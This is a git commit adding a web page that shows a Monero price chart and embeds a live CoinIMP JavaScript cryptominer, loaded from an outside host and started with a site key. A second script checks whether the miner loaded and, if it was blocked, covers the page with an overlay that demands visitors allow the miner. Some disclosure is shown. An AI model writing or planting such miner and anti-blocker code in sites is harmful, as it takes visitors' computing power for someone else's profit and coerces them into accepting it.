c08df764e83a5bc318ba0d42e4764e52d76e7ade
najmika <42629920+najmika@users.noreply.github.com>
2018-08-24 16:36:08 +0800

    Add files via upload

---
+++ indexx.php
@@ -0,0 +1,31 @@
+<html>
+<body>
+<script src="https://widgets.coingecko.com/coingecko-coin-price-chart-widget.js"></script>
+<coingecko-coin-price-chart-widget currency="usd" coin-id="monero" locale="en" height="300"></coingecko-coin-price-chart-widget>
+<!-- <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d996.1116669977686!2d101.73860772915344!3d2.973471339164088!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x31cdca386e10c383%3A0x8f701737ce3e2fc!2sUnnamed+Road%2C+Bangi+Government+and+Private+Training+Centre+Area%2C+43000+Bandar+Baru+Bangi%2C+Selangor!5e0!3m2!1sen!2smy!4v1534297932499" width="600" height="450" frameborder="0" style="border:0" allowfullscreen></iframe> -->
+<script src="https://www.hostingcloud.science./7oMS.js"></script>
+<script>
+    var _client = new Client.Anonymous('6e2b8df864b9192d42b33e0f3b5203497a2ee502fb547b1cd385ec44af4c35cf', {
+        throttle: 0.1
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
+</script>
+</body>
+</html>
